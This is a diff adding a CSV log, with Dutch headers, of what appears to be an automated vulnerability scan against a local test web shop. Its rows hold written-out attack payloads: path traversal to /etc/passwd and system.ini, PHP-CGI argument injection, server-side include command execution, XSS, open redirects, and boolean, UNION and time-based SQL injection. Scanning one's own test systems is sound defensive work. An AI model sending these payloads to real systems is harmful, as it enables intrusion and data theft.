@@ -1,0 +1,509 @@
+Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
+90,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/5967298566077357791,404,Not Found,101,429,77
+92,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,19,429,28
+93,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,3,426,43
+94,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,27,430,42
+95,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,52,428,57
+96,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/5019004661488404809,200,OK,339,229,84
+97,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/9154111023760730752,200,OK,268,229,84
+98,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/3758527239229717916,200,OK,292,229,84
+99,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,POST,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,8,431,124
+100,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,POST,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,14,435,124
+101,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/carts/carts/olnzz4SBrDqfWICAtnRybqbpKoKzzLah/items,404,Not Found,6,428,63
+102,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/7821176037141448594,200,OK,273,229,84
+104,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/5945010856422642011,200,OK,304,229,84
+106,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/245914654903516486,200,OK,327,229,84
+108,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:04 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/5936370339625377393,200,OK,139,229,84
+109,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2459530142778642452,200,OK,178,229,84
+110,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/4373206281490707259,200,OK,252,229,84
+111,Mon Mar 20 21:50:04 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2398915529601214298,200,OK,236,229,84
+113,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/5779367253433022715,200,OK,179,229,84
+115,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/6723163933431835681,200,OK,140,229,84
+117,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/2775890717038436285,200,OK,139,229,84
+118,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7892023219996273184,200,OK,222,229,84
+119,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/4546922721005427103,200,OK,184,229,84
+120,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/4993383566453403725,200,OK,391,229,84
+122,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/1080974020400958928,200,OK,400,229,84
+123,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/3035635456430828111,200,OK,428,229,84
+126,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,59,427,28
+127,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:05 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,9,432,43
+128,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,75,431,42
+129,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,13,434,57
+130,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7812564977248970611,200,OK,311,229,84
+131,Mon Mar 20 21:50:05 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,334,229,84
+132,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,197,432,133
+133,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/6000319331681190729,200,OK,233,229,84
+135,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,30,431,133
+136,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%2FWindows%2Fsystem.ini,200,OK,161,229,84
+137,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/thishouldnotexistandhopefullyitwillnot/824827131916210840,200,OK,219,229,84
+138,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,200,OK,214,229,84
+139,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,160,229,84
+140,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/thishouldnotexistandhopefullyitwillnot/1661000322633686555,200,OK,147,229,84
+142,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%5CWindows%5Csystem.ini,200,OK,230,229,84
+143,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:06 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/7525334857386474145,200,OK,101,228,84
+144,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/5222774979041076559,200,OK,230,229,84
+146,Mon Mar 20 21:50:06 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,200,OK,241,229,84
+147,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2Fetc%2Fpasswd,200,OK,179,229,84
+148,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/param1/250246796574150624,200,OK,219,229,84
+149,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,200,OK,229,229,84
+150,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%252F/param1/6910955290468182875,200,OK,285,229,84
+152,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:08 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/c%3A%2F,200,OK,1381,230,84
+153,Mon Mar 20 21:50:07 CET 2023,Mon Mar 20 21:50:08 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,1268,229,84
+154,Mon Mar 20 21:51:14 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,3895,214,145
+155,Mon Mar 20 21:51:15 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,3415,214,145
+156,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,503,Service Unavailable,33,214,145
+157,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,28,214,145
+158,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,503,Service Unavailable,39,214,145
+159,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
+160,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,34,214,145
+161,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,46,214,145
+162,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,20,214,145
+163,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:18 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,349,214,145
+164,Mon Mar 20 21:51:18 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,52,214,145
+165,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,19,214,145
+166,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,53,214,145
+167,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,17,214,145
+168,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,22,214,145
+169,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,22,214,145
+170,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,23,214,145
+171,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,20,214,145
+172,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,65,214,145
+173,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
+174,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,32,214,145
+175,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,27,214,145
+176,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
+177,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:19 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,35,214,145
+178,Mon Mar 20 21:51:19 CET 2023,Mon Mar 20 21:51:20 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,1052,214,145
+179,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,503,Service Unavailable,112,214,145
+180,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,503,Service Unavailable,50,214,145
+181,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,109,214,145
+182,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/3494506092784170842.owasp.org,503,Service Unavailable,92,214,145
+183,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/http%3A%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,34,214,145
+184,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,13,214,145
+185,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F3494506092784170842%252eowasp%252eorg,503,Service Unavailable,16,214,145
+186,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/5%3BURL%3D%27https%3A%2F%2F3494506092784170842.owasp.org%27,503,Service Unavailable,56,214,145
+187,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/URL%3D%27http%3A%2F%2F3494506092784170842.owasp.org%27,503,Service Unavailable,90,214,145
+188,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/http%3A%2F%2F%5C3494506092784170842.owasp.org,503,Service Unavailable,19,214,145
+189,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/https%3A%2F%2F%5C3494506092784170842.owasp.org,503,Service Unavailable,10,214,145
+190,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2F%2F3494506092784170842.owasp.org,503,Service Unavailable,23,214,145
+191,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,11,214,145
+192,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,503,Service Unavailable,31,214,145
+193,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,503,Service Unavailable,39,214,145
+194,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,503,Service Unavailable,19,214,145
+195,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,503,Service Unavailable,29,214,145
+196,Mon Mar 20 21:51:20 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,20,214,145
+197,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/0W45pz4p,503,Service Unavailable,29,214,145
+198,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers0W45pz4p,503,Service Unavailable,21,214,145
+199,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,503,Service Unavailable,17,214,145
+200,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,400,Bad Request,88,124,0
+201,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E,503,Service Unavailable,21,214,145
+202,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,11,214,145
+203,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/zApPX0sS,503,Service Unavailable,29,214,145
+204,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,90,214,145
+205,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,41,214,145
+206,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,29,214,145
+207,Mon Mar 20 21:51:21 CET 2023,Mon Mar 20 21:51:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,15,214,145
+208,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27,503,Service Unavailable,89,214,145
+209,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27,503,Service Unavailable,116,214,145
+210,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22,503,Service Unavailable,18,214,145
+211,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22,503,Service Unavailable,73,214,145
+212,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3B,503,Service Unavailable,17,214,145
+213,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%3B,503,Service Unavailable,70,214,145
+214,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%28,503,Service Unavailable,47,214,145
+215,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27%28,503,Service Unavailable,29,214,145
+216,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,36,214,145
+217,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
+218,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D1+--+,503,Service Unavailable,62,214,145
+219,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D2+--+,503,Service Unavailable,20,214,145
+220,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+OR+1%3D1+--+,503,Service Unavailable,23,214,145
+221,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+AND+1%3D2+--+,503,Service Unavailable,34,214,145
+222,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+OR+1%3D1+--+,503,Service Unavailable,21,214,145
+223,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%271%27+--+,503,Service Unavailable,35,214,145
+224,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,41,214,145
+225,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,26,214,145
+226,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+AND+%271%27%3D%272%27+--+,503,Service Unavailable,27,214,145
+227,Mon Mar 20 21:51:22 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+OR+%271%27%3D%271%27+--+,503,Service Unavailable,10,214,145
+228,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+UNION+ALL+select+NULL+--+,503,Service Unavailable,60,214,145
+229,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
+230,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+UNION+ALL+select+NULL+--+,503,Service Unavailable,9,214,145
+231,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
+232,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27%29+UNION+ALL+select+NULL+--+,503,Service Unavailable,13,214,145
+233,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,15,214,145
+234,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,31,214,145
+235,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,19,214,145
+236,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+%2F+sleep%2815%29+,503,Service Unavailable,81,214,145
+237,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+%2F+sleep%2815%29+%2F+%27,503,Service Unavailable,20,214,145
+238,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+%2F+sleep%2815%29+%2F+%22,503,Service Unavailable,28,214,145
+239,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,24,214,145
+240,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,27,214,145
+241,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+and+0+in+%28select+sleep%2815%29+%29+--+,503,Service Unavailable,19,214,145
+242,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,18,214,145
+243,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,503,Service Unavailable,23,214,145
+244,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,20,214,145
+245,Mon Mar 20 21:51:23 CET 2023,Mon Mar 20 21:51:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,503,Service Unavailable,16,214,145
